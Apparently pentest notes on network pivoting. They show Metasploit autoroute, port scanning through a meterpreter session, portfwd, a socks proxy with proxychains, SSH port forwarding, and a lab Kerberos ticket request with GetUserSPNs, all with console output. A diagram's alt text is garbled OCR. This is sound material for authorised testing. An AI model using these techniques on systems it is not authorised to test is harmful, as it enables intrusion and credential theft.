---
description: >-
  Pivoting is a set of techniques used during red team/pentest engagements which
  make use of attacker-controlled hosts as logical network hops with the aim of
  amplifying network visibility.
---

# Pivoting

A good guide for pivoting:  [https://artkond.com/2017/03/23/pivoting-guide/](https://artkond.com/2017/03/23/pivoting-guide/)

[https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)

## Metasploit

### Autoroute

Can be used on a meterpreter shell

#### add route

```text
use post/multi/manage/autoroute 
msf5 post(multi/manage/autoroute) > show options  
Module options (post/multi/manage/autoroute): 
   Name     Current Setting  Required  Description 
   ----     ---------------  --------  ----------- 
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default) 
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24" 
   SESSION                   yes       The session to run this module on. 
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0) 
meterpreter > run autoroute -s 192.73.79.3 
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute. 
[!] Example: run post/multi/manage/autoroute OPTION=value [...] 
[*] Adding a route to 192.73.79.3/255.255.255.0... 
[+] Added route to 192.73.79.3/255.255.255.0 via 192.53.57.3 
[*] Use the -p option to list all active routes 
```

#### print routes 

```text
msf5 post(multi/manage/autoroute) > run 
[!] SESSION may not be compatible with this module. 
[*] Running module against 192.53.57.3 
IPv4 Active Routing Table 
========================= 
   Subnet             Netmask            Gateway 
   ------             -------            ------- 
   192.73.79.3        255.255.255.0      Session 2 
```

#### Port scan

```text
use auxiliary/scanner/portscan/tcp 
msf5 post(multi/manage/autoroute) > use auxiliary/scanner/portscan/tcp  
msf5 auxiliary(scanner/portscan/tcp) > show options  
Module options (auxiliary/scanner/portscan/tcp): 
   Name         Current Setting  Required  Description 
   ----         ---------------  --------  ----------- 
   CONCURRENCY  10               yes       The number of concurrent ports to check per host 
   DELAY        0                yes       The delay between connections, per thread, in milliseconds 
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds. 
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900) 
   RHOSTS                        yes       The target address range or CIDR identifier 
   THREADS      1                yes       The number of concurrent threads 
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds 
msf5 auxiliary(scanner/portscan/tcp) > set rhosts 192.73.79.3 
rhosts => 192.73.79.3 
msf5 auxiliary(scanner/portscan/tcp) > set threads 10 
threads => 10 
msf5 auxiliary(scanner/portscan/tcp) > run 
[+] 192.73.79.3:          - 192.73.79.3:139 - TCP OPEN 
[+] 192.73.79.3:          - 192.73.79.3:445 - TCP OPEN 
[*] 192.73.79.3:          - Scanned 1 of 1 hosts (100% complete) 
```

### Portfwd

#### Add port forward 

`meterpreter > portfwd add –l 3389 –p 3389 –r  [target host]` 

* **add** will add the port forwarding to the list and will essentially create a tunnel for us. Please note, this tunnel will also exist outside the Metasploit console, making it available to any terminal session. 
* **-l 3389** is the local port that will be listening and forwarded to our target. This can be any port on your machine, as long as it’s not already being used. 
* **-p 3389** is the destination port on our targeting host. 
* **-r \[target host\]** is the our targeted system’s IP or hostname. 

#### Delete 

`meterpreter > portfwd delete –l 3389 –p 3389 –r [target host]` 

#### LIST 

`meterpreter > portfwd list` 

### Socks Proxy

#### Create a sock proxy

```text
msf > use auxiliary/server/socks4a 
msf auxiliary(server/socks4a) > options 
Module options (auxiliary/server/socks4a): 
Name     Current Setting  Required  Description 
   ----     ---------------  --------  ----------- 
   SRVHOST  0.0.0.0          yes       The address to listen on 
   SRVPORT  1080             yes       The port to listen on. 
Auxiliary action: 
Name   Description 
   ----   ----------- 
   Proxy 
msf auxiliary(server/socks4a) > run 
[*] Auxiliary module running as background job 0. 
[*] Starting the socks4a proxy server 
msf auxiliary(server/socks4a) > route add 10.10.10.103 255.255.255.255 1 
```

#### check /etc/proxychains.conf

```text
strict_chain 
proxy_dns  
tcp_read_time_out 15000 
tcp_connect_time_out 8000 
[ProxyList] 
socks4  127.0.0.1 1080 
```

#### use proxcychain 

`root@kali# proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 htb.local/amanda` 

## SSH

Once you ssh'd into a machine press '~' and press C \(capital C\) 

```text
dave@ubuntu:/tmp$  ~C 
ssh> help 
Commands: 
-L[bind_address:]port:host:hostport    Request local forward 
-R[bind_address:]port:host:hostport    Request remote forward 
-D[bind_address:]port                  Request dynamic forward 
-KL[bind_address:]port                 Cancel local forward 
-KR[bind_address:]port                 Cancel remote forward 
-KD[bind_address:]port                 Cancel dynamic forward 
```

Example: 

`dave@ubuntu:/tmp$ssh> -L 8001:192.168.122.4:80 Forwarding port.` 

* then we will forward 192.168.122.4:80 to the local port 8001 \(on our KALI machine! - this is due to has ssh'd into the intermedia machine\) 

Results in: 

```text
root@kali:# curl localhost:8001 
<h1> Welcome to the Sparklays DNS Server </h1> 
<p> 
<a href="dns-config.php">Click here to modify your DNS Settings</a><br> 
<a href="vpnconfig.php">Click here to test your VPN Configuration</a> 
```

### Local port forwarding

 ![SSH gateway 
Webse rve r 
10.0.0.1 
10.0.0.2:80 
SSA 
.0.2. 
.0.1 
Routed traffic 
tunne 1 
Command 
ssh -L 1337. 
&#x2022;10.0 
Local proxy 
port: 1337 
Opera tor 
&#x2022;80 
root@10 . O ](data:image/png;base64,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sHPPPdf233//sAegJ3rNa17T5jvnOkJgAioDgamLunKl746Ck67foi/m1IsjAEQEJqAysIapG02aNMmHpt///vc2ceLE0Jql67f85Cc/sSeffDK0AACASkFg2gPaC05ax6QRKAAAUFkITHtQfnDS7CijTAAAVB4CUwWIwel//ud/fHBilAkAgMpCYKog73rXu3xw+uAHP8goEwAAFYTAVIE04sSVgwEAqBxVfVmB/ke9JtTKY8dzz4RaW125rAAAdFbaZQVGjRoVauWxdOnSUGuLywqgN6nqwHT4rX+0vsMPDXul9/w5p1nzlk1hrzUCE4DukBaY5s2bZ4MGDQp7pXfeeeeFWlsEJvQmTMkBAACkIDABAACkqPqvRqnde3ColV5703HClByA7pA2JVfO6ThpaGgItbaYkkNvUvUjTAo15SoAUOkUaMpZAGQxJQcAAJCCwAQAAJCCwAQAAJCCwAQAAJCiqj8lt//7Lizrp+Revf3mdhd/8yk5AN0h7VNy55xzTlk/KXfbbbeFWlt8Sg69CVf67gBX+gawp3Glb6AyMCUHAACQoqpHmDTCU1fGEaZVl13CCBOAPSpthOkrX/lKWUeYLrvsslBrixEm9CZVf6XvPYXABKA7pAWmPYnAhN6EKTkAAIAUBCYAAIAUBCYAAIAUBCYAAIAUBCYAAIAUBCYAAIAUBCYAAIAUFX0dph3PPeNLJdIFMweeeEbYA4DyePLJJ23t2rVhr7IcdNBBdtxxx4U9oGer6MAEAABQCZiSAwAASEFgAgAASEFgAgAASEFgAgAASEFgAgAASEFgAgAASEFgAgAASEFgAgAASEFgAgAASEFgAgAASEFgAgAASEFgAgAASNEjv3z3H//4R6iZjRw50vr16xf2WiT7HH300aEGAADQVo8bYbr66qtt9OjRrUq+cePGtTp+6aWXhiMAAABtMSUHAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsAEAACQgsDUQ9XU1NiMGTPCXnVa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